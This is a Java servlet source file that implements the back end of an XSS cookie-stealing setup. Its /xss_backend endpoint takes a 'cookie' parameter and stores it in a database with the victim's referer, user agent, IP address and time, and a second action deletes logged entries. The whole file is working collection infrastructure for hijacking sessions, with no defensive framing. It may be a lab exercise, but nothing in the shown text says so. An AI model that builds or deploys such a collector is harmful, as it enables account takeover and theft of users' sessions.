package com.example.moriya;

import java.io.IOException;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.text.SimpleDateFormat;
import jakarta.servlet.ServletException;
import jakarta.servlet.annotation.WebServlet;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

@WebServlet("/xss_backend")
public class xss_backend extends HttpServlet {
    private static final long serialVersionUID = 1L;

    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String action = request.getParameter("action");

        if ("log".equals(action)) {
            logCookieData(request, response);
        } else if ("deleteLog".equals(action)) {
            deleteLogEntry(request, response);
        }
    }

    private void logCookieData(HttpServletRequest request, HttpServletResponse response) throws IOException {
        String cookieData = request.getParameter("cookie");
        String referer = request.getHeader("Referer");
        String userAgent = request.getHeader("User-Agent");
        String ipAddress = request.getRemoteAddr();
        String timeStamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new java.util.Date());

        try (Connection conn = DBUtil.getConnection()) {
            String sql = "INSERT INTO xss_data (cookie, referer, useragent, ipaddress, time) VALUES (?, ?, ?, ?, ?)";
            PreparedStatement stmt = conn.prepareStatement(sql);
            stmt.setString(1, cookieData);
            stmt.setString(2, referer);
            stmt.setString(3, userAgent);
            stmt.setString(4, ipAddress);
            stmt.setString(5, timeStamp);
            stmt.executeUpdate();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void deleteLogEntry(HttpServletRequest request, HttpServletResponse response) throws IOException {
        int id = Integer.parseInt(request.getParameter("id"));

        try (Connection conn = DBUtil.getConnection()) {
            String sql = "DELETE FROM xss_data WHERE id = ?";
            PreparedStatement stmt = conn.prepareStatement(sql);
            stmt.setInt(1, id);
            stmt.executeUpdate();
        } catch (Exception e) {
            e.printStackTrace();
        }
        response.sendRedirect("xss_backend.jsp");
    }
}

